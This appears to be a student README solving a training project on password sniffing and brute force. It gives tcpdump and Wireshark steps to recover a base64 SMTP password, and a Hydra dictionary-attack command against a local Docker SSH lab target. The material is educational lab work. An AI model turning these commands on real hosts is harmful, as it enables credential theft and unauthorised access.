# Attack is the best defense

### Project Background

The optional project, "Attack is the Best Defense," delves into DevOps, scripting, and hacking. This readme file contain details on how to solve the project.

### Prerequisites

Before you begin, ensure you have the following:

- Comfort working with the command line interface and basic bash scripting knowledge.
- Understanding of computer networking fundamentals.

### Requirements

- Linux Machine or VM: Install a Linux OS, preferably a pentesting OS like Kali Linux or Parrot OS. I used Kali linux for this project
- Wireshark: A network protocol analyzer; ensure it's installed on your machine.

### Task 0: ARP Spoofing and Sniffing Unencrypted Traffic

#### Network Sniffing Procedure

1. Open two terminals on your Linux machine or VM.
2. Launch tcpdump in one terminal to begin capturing:

   ```bash
   sudo tcpdump -i wlan0 -w get_it.pcap
   ```

   - `-i`: Specifies the network interface.
   - `-w`: Specifies writing raw packets to a file.

3. In the other terminal, run the `user_authenticating_into_server` script.

4. Manually exit tcpdump with Ctrl+C when the script completes.

#### Analyzing Captured Packets with Wireshark

1. Open the file with Wireshark for detailed analysis.

2. Right-click >> Protocol Preferences >> Simple Mail Transfer Protocol >> Decode Base64 encoded AUTH parameters to find the password.

### Task 1: Dictionary Attack

#### Requirements

- Docker installed on your Linux machine or VM.
- Hydra tool installed:

   ```bash
   sudo apt update
   sudo apt install hydra
   ```

#### Dictionary Attack Procedure

1. Run the Docker image:

   ```bash
   docker run -p 2222:22 -d -ti sylvainkalache/264–1
   ```

2. Use Hydra to perform a dictionary attack:

   ```bash
   sudo hydra -l sylvain -P rockyou.txt ssh://127.0.0.1:2222 -t 4
   ```

   - `-l`: Specifies the username.
   - `-P`: Specifies the password wordlist.
   - `-t`: Sets the number of parallel tasks (threads).

### Conclusion

This project demonstrates the vulnerabilities of unencrypted protocols and the importance of secure authentication methods. It highlights the risks associated with plaintext transmission of sensitive information and emphasizes the need for stronger authentication systems in enterprises.

Feel free to explore the comprehensive manuals for [tcpdump](https://www.tcpdump.org/manpages/tcpdump.1.html) and [hydra](https://github.com/vanhauser-thc/thc-hydra) for more in-depth information.

Happy hacking! 🚀
